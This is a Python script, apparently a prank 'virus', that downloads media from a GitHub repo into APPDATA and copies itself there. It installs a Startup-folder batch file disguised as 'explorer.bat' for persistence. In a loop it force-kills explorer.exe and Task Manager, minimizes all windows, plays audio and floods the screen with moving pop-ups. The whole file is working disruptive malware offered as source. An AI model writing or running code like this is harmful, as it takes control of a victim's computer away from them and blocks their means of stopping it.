# Andrew Maney 2022

from concurrent.futures import thread

from itsdangerous import exc


while True:
    try:
        # IMPORTS
        try:
            import os
            import sys
            from os import path
            import threading
            from playsound import playsound
            import requests
            import shutil
            import time
            from datetime import datetime
            from tkinter import *
            from random import randrange
            from PIL import Image
        except:
            os.system("pip install " + "requests")
            os.system("pip install " + "playsound==1.2.2")
            os.system("pip install " + "pillow")
            import os
            import sys
            from os import path
            import threading
            from playsound import playsound
            import requests
            import shutil
            import time
            from datetime import datetime
            from tkinter import *
            from random import randrange
            from PIL import Image



        # VARS
        AppDataPath = os.getenv('APPDATA')
        StartupPath = (AppDataPath + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        now = datetime.now()
        StartFunctions = True



        # FUNCTIONS
        def DownloadFiles():
            if("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" in os.getcwd()):
                0+0
            elif(AppDataPath in os.getcwd()):
                0+0
            else:
                if(path.exists(AppDataPath + "/lmao.mp3")):
                    0+0
                else:
                    r = requests.get("https://github.com/MEMESCOEP/Virus2/blob/main/Hey%20Ya!%20Low%20quality.mp3?raw=true")
                    with open('./lmao.mp3', 'wb') as f:
                        f.write(r.content)
                    shutil.move('./lmao.mp3', AppDataPath)

                if(path.exists(AppDataPath + "/lmao.png")):
                    0+0
                else:
                    r = requests.get("https://github.com/MEMESCOEP/Virus2/raw/main/lmao.png")
                    with open('./lmao.png', 'wb') as f:
                        f.write(r.content)            
                    shutil.move('./lmao.png', AppDataPath)


                if(path.exists(AppDataPath + "/lmao2.png")):
                    0+0
                else:
                    r = requests.get("https://github.com/MEMESCOEP/Virus2/raw/main/lmao2.png")
                    with open('./lmao2.png', 'wb') as f:
                        f.write(r.content)            
                    shutil.move('./lmao2.png', AppDataPath)


        def PlaySound():
            pathtoaudio = AppDataPath + "/lmao.mp3"
            while True:          
                playsound(pathtoaudio, block=False)
                time.sleep(230)
                
                    


        def CopyFiles():
            
            if("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" in os.getcwd()):
                0+0
            elif(AppDataPath in os.getcwd()):
                0+0
            else:
                minData = """powershell -command "& { $x = New-Object -ComObject Shell.Application; $x.minimizeall() }"""
                batData = """@echo off
{}
cd "{}"
python {}
pause
""".format(minData, AppDataPath, os.path.basename(__file__))
                shutil.copyfile(sys.argv[0], AppDataPath + "/{}".format(os.path.basename(__file__)))
                with open(StartupPath + "\\explorer.bat", "w") as f:
                    f.writelines(batData)
                    f.close


        def MinimizeWindows():
            while True:
                minData = """powershell -command "& { $x = New-Object -ComObject Shell.Application; $x.minimizeall() }"""
                os.system(minData)
                time.sleep(5)



        def KillProcesses():
            while True:
                os.system("taskkill /IM explorer.exe /F")
                os.system("taskkill /IM taskmgr.exe /F")
                time.sleep(15)



        def System():
            global StartFunctions
            pth = threading.Thread(target=PlaySound)
            kth = threading.Thread(target=KillProcesses)
            mth = threading.Thread(target=MinimizeWindows)
            windows = []
            while True:
                if(now.hour >= 8):  
                    if StartFunctions == True:          
                        pth.start()
                        kth.start()
                        mth.start()
                    StartFunctions = False


                    window = Tk()
                    window.title('LMFAO get trolleded lolololololololol')
                    
                    imagePaths = [Image.open(AppDataPath + "\\lmao.png"), Image.open(AppDataPath + "\\lmao2.png")]

                    images = [PhotoImage(file=(AppDataPath + "\\lmao.png")), PhotoImage(file=(AppDataPath + "\\lmao2.png"))]
                    
                    window.resizable(False, False)            
                    canvas = Canvas(window, width = 1000, height = 300)
                    canvas.pack()
                    my_image = images[randrange(len(images) - 1)]
                    canvas.create_image(0, 0, anchor = NW, image=my_image)
                    for x in range(100):
                        indeximg = randrange(len(images))
                        img = imagePaths[indeximg] 
                        width = img.width
                        height = img.height
                        my_image = images[indeximg]                        
                        nw = Toplevel(window)                        
                        w = width
                        h = height

                        # calculate x and y coordinates for the Tk root window
                        x = randrange(1281)
                        y = randrange(721)
                        randTop = randrange(10)

                        canvas = Canvas(nw, width = w, height = h)
                        canvas.pack()
                        canvas.create_image(0, 0, anchor = NW, image=my_image)
                        nw.geometry('%dx%d+%d+%d' % (w, h, x, y))
                        if(randTop == 3):
                            nw.attributes('-topmost',True)
                            windows.append(nw)
                        nw.update()
                        
                    TimeToSleep = 1
                    while True:
                        try:
                            if TimeToSleep > 0.01:
                                TimeToSleep -= 0.05
                            else:
                                TimeToSleep = 0.01
                            time.sleep(TimeToSleep)
                            for tkwindow in windows:
                                # calculate x and y coordinates for the Tk root window
                                x = randrange(1281)
                                y = randrange(721)
                                tkwindow.geometry('+%d+%d' % (x, y))
                                tkwindow.update()
                        except:
                            0+0
                    window.mainloop()
                else:
                    time.sleep(1)


        DownloadFiles()
        CopyFiles()
        System()
        


        
    except Exception as EX:
        print(EX)
        with open("loglmao.txt", "w") as f:
            f.writelines(str(EX))


